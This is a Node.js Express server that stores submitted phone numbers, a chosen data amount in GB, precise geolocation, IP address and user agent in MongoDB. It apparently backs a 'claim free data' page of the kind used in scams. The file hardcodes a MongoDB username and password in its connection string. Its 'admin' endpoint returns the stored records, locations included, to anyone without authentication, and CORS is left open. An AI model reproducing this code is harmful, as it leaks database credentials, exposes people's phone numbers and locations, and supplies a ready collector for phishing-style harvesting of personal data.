import express from 'express';
import cors from 'cors';
import { MongoClient } from 'mongodb';
import dotenv from 'dotenv';

dotenv.config();

const app = express();
const PORT = process.env.PORT || 3001;

// Middleware
app.use(cors());
app.use(express.json());

// MongoDB connection
const MONGODB_URI = process.env.MONGODB_URI || 'mongodb+srv://Madhuka:madhuka@mern-blog.2koaf.mongodb.net/mern-blog?retryWrites=true&w=majority&appName=mern-blog';
let db;

async function connectToMongoDB() {
  try {
    const client = new MongoClient(MONGODB_URI);
    await client.connect();
    db = client.db('mern-blog');
    console.log('✅ Connected to MongoDB successfully');
  } catch (error) {
    console.error('❌ MongoDB connection error:', error);
    process.exit(1);
  }
}

// API Routes
app.post('/api/claim-data', async (req, res) => {
  try {
    const { phoneNumber, selectedGB, location } = req.body;
    
    // Validate required fields
    if (!phoneNumber || !selectedGB) {
      return res.status(400).json({ 
        success: false, 
        error: 'Phone number and GB selection are required' 
      });
    }

    // Prepare data to store
    const claimData = {
      phoneNumber,
      selectedGB,
      location: location || null,
      timestamp: new Date(),
      ipAddress: req.ip || req.connection.remoteAddress,
      userAgent: req.get('User-Agent')
    };

    // Store in MongoDB
    const result = await db.collection('data_claims').insertOne(claimData);
    
    console.log('📱 New data claim stored:', {
      id: result.insertedId,
      phoneNumber,
      selectedGB,
      hasLocation: !!location
    });

    res.json({
      success: true,
      message: 'Data claim submitted successfully',
      claimId: result.insertedId,
      data: {
        phoneNumber,
        selectedGB,
        location: location ? {
          latitude: location.latitude,
          longitude: location.longitude,
          accuracy: location.accuracy
        } : null
      }
    });

  } catch (error) {
    console.error('❌ Error storing claim data:', error);
    res.status(500).json({ 
      success: false, 
      error: 'Internal server error' 
    });
  }
});

// Get all claims (for admin purposes)
app.get('/api/claims', async (req, res) => {
  try {
    const claims = await db.collection('data_claims')
      .find({})
      .sort({ timestamp: -1 })
      .limit(100)
      .toArray();
    
    res.json({
      success: true,
      data: claims
    });
  } catch (error) {
    console.error('❌ Error fetching claims:', error);
    res.status(500).json({ 
      success: false, 
      error: 'Internal server error' 
    });
  }
});

// Health check endpoint
app.get('/api/health', (req, res) => {
  res.json({ 
    success: true, 
    message: 'Server is running',
    timestamp: new Date(),
    mongodb: db ? 'connected' : 'disconnected'
  });
});

// Start server
async function startServer() {
  await connectToMongoDB();
  
  app.listen(PORT, () => {
    console.log(`🚀 Server running on http://localhost:${PORT}`);
    console.log(`📊 Health check: http://localhost:${PORT}/api/health`);
    console.log(`📱 Claims endpoint: http://localhost:${PORT}/api/claim-data`);
  });
}

startServer().catch(console.error);
